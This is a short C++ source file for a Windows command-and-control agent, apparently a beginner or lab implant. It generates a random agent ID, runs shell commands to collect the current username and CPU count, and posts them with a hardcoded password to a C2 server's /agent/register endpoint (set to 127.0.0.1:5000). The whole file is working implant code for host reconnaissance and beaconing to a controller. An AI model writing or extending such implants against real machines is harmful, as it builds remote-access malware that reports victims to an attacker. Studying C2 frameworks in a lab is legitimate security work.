#include <windows.h>
#include <string>
#include <iostream>
#include <stdlib.h>
#include "http.h"
#include "exec_shell.h"

LPCWSTR c2Domain = L"127.0.0.1";
LPCWSTR registerURI = L"/agent/register";
std::string password = "password";
int port = 5000;
std::string agentId;

// generate a random agent id of size digits
std::string generateRandomId(int size) {
    std::string id = "";
    for (int i = 0; i < size; i++) {
        id += std::to_string(rand() % 10);
    }
    return id;
}

// register the agent on the c2 server
BOOL registerAgent() {
    std::string payload = "{\"whoami\":\"" + exec_shell(CommonCmd::whoami) + "\",\"agent_id\":" + agentId + 
                          ",\"password\":\"" + password + "\",\"cpus\":" + exec_shell(CommonCmd::cpu_num) + "}";
    std::cout << payload << std::endl;
    std::string response = httpPost(c2Domain, port, registerURI, payload);
    std::cout << response << std::endl;
    return TRUE;
}

int main(int argc, char* argv[]){
    agentId = generateRandomId(10);
    registerAgent();
    return 0;
}